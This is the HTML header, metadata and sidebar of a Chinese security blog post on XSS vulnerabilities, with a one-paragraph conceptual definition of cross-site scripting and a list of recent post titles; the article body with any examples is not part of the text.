
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>浅析XSS漏洞 - hybcx's blog</title>

  
    <meta name="description" content="XSS注入总结 一、XSS漏洞原理 XSS，即跨站脚本攻击，是指攻击者利用Web服务器中的应用程序或代码漏洞，在页面中嵌入客户端脚本（通常是一段由JavaScript编写的恶意代码，少数情况下还有ActionScript、VBScript等语言），当信任此Web服务器的用户访问Web站点中含有恶意脚本代码的页面或打开收到的URL链接时，用户浏览器会自动加载并执行该恶意代码，从而达到攻击的目的。 当">
<meta property="og:type" content="article">
<meta property="og:title" content="浅析XSS漏洞">
<meta property="og:url" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="XSS注入总结 一、XSS漏洞原理 XSS，即跨站脚本攻击，是指攻击者利用Web服务器中的应用程序或代码漏洞，在页面中嵌入客户端脚本（通常是一段由JavaScript编写的恶意代码，少数情况下还有ActionScript、VBScript等语言），当信任此Web服务器的用户访问Web站点中含有恶意脚本代码的页面或打开收到的URL链接时，用户浏览器会自动加载并执行该恶意代码，从而达到攻击的目的。 当">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/image-20230328211110610.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/image-20230328211120983.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/image-20230328211358253.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/image-20230328212119810.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/image-20230328212941614.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/image-20230328213914905.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613190302252.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613191636666.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613191756421.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613191806665.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/image-20230613191819543.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613192445171.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613202224727.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613202410868.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613202718363.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613202644986.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613204850445.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613204907648.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613204926199.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613205046884.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613205155520.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613205331480.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613205256232.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613205537937.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613210228315.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613210411147.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613210806648.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613210917413.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613211243996.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613211744113.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613212733311.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213010680.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213027969.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213107175.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213239474.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213331253.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613213738585.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613214421855.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613214542721.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613214601015.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613214827824.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613215618484.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613215657023.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613220200088.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613220441105.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230613220758486.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614104228257.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614105256890.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614105134632.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614110625908.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614110911065.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614111025197.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614111350817.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614111443421.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614111609567.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230614111808477.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615185617829.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615190225643.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615190155329.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615190304167.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615190343645.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192005502.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615190915568.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192044762.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192119271.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192224620.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192239183.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192359743.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192759774.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615192858584.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193044908.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193231941.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193846749.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193938966.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193947420.png">
<meta property="og:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/%E6%B5%85%E6%9E%90XSS%E6%BC%8F%E6%B4%9E/image-20230615193959786.png">
<meta property="article:published_time" content="2023-08-07T01:16:40.250Z">
<meta property="article:modified_time" content="2023-12-21T08:47:31.132Z">
<meta property="article:author" content="hybcx">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://hybcx.xyz/2023/08/07/qian-xi-xss-lou-dong/image-20230328211110610.png">
  
  
  
  

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/05/26/flask-nei-cun-ma-xue-xi/"><span class="title">Flask内存马学习</span></a><a class="item title" href="/2024/06/01/seacms-dai-ma-shen-ji/"><span class="title">SeaCMS代码审计</span></a><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-进攻性渗透测试</span></a><a class="item title" href="/2024/06/01/ju-zhen-bei/"><span class="title">矩阵杯</span></a><a class="item title" href="/2024/05/05/tmh-huan-chong-qu-yi-chu/"><span class="title">TMH-缓冲区溢出学习</span></a><a class="item title" href="/2024/05/29/bluecms-dai-ma-shen-ji/"><span class="title">BlueCMS代码审计</span></a><a class="item title" href="/2024/05/12/h-nctf2024/"><span class="title">H&NCTF2024</span></a><a class="item title" href="/2024/05/21/ciscn-2024wp/"><span class="title">CISCN-2024Wp</span></a><a class="item title" href="/2024/04/30/hnctf-2022/"><span class="title">HNCTF2022</span></a><a class="item title" href="/2024/04/23/php-xue-xi-zong-jie/"><span class="title">PHP学习总结</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/">常见top漏洞</a></div>
